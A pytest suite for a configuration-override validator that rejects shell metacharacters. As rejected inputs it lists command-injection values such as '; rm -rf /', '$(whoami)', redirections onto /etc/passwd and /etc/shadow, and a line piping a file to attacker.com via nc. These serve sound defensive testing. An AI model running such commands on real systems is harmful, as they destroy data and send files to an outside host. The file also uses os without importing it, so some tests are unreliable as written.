"""Security-focused tests for scripts/run_sweep.py validation."""

from __future__ import annotations

import tempfile

import pytest
from run_sweep import _validate_override


class TestOverrideValidation:
    """Test suite for _validate_override security function."""

    def test_valid_simple_key(self) -> None:
        """Valid keys with alphanumeric, dots, underscores, hyphens."""
        _validate_override("train.seed", 42)
        _validate_override("model_name", "gpt2")
        _validate_override("learning-rate", 0.001)
        _validate_override("batch_size", 32)

    def test_valid_nested_key(self) -> None:
        """Valid nested configuration keys."""
        _validate_override("model.layers.0.size", 128)
        _validate_override("train.optimizer.lr", 0.01)

    def test_valid_values(self) -> None:
        """Valid values of different types."""
        _validate_override("seed", 42)
        _validate_override("name", "model-v1")
        _validate_override("rate", 0.001)
        _validate_override("flag", True)
        _validate_override("path", os.path.join(tempfile.gettempdir(), "data"))

    def test_reject_non_string_key(self) -> None:
        """Reject non-string keys."""
        with pytest.raises(ValueError, match="Override key must be string"):
            _validate_override(123, "value")  # type: ignore

    def test_reject_key_with_spaces(self) -> None:
        """Reject keys containing spaces."""
        with pytest.raises(ValueError, match="Invalid override key"):
            _validate_override("train seed", 42)

    def test_reject_key_with_special_chars(self) -> None:
        """Reject keys with shell metacharacters."""
        with pytest.raises(ValueError, match="Invalid override key"):
            _validate_override("train;seed", 42)
        with pytest.raises(ValueError, match="Invalid override key"):
            _validate_override("train|seed", 42)
        with pytest.raises(ValueError, match="Invalid override key"):
            _validate_override("train&seed", 42)

    def test_reject_value_with_command_injection(self) -> None:
        """Reject values containing shell metacharacters for command injection."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("seed", "; rm -rf /")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "$(whoami)")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "`whoami`")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "data | cat")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "data & sleep 10")

    def test_reject_value_with_redirection(self) -> None:
        """Reject values with I/O redirection operators."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("file", "> /etc/passwd")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("file", "< /etc/shadow")

    def test_reject_value_with_pipe(self) -> None:
        """Reject values with pipe operators."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "cat file | nc attacker.com 1234")

    def test_reject_value_with_subshell(self) -> None:
        """Reject values with subshell execution."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "(sleep 10)")
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_override("cmd", "value)")

    def test_allow_safe_special_chars(self) -> None:
        """Allow safe special characters in values."""
        _validate_override("path", os.path.join(tempfile.gettempdir(), "data/file.txt"))
        _validate_override("expr", "x+y")
        _validate_override("ratio", "1:2")
        _validate_override("email", "test@example.com")
        _validate_override("version", "1.0.0")
        _validate_override("list", "[1,2,3]")
        _validate_override("dict", "{a:1,b:2}")
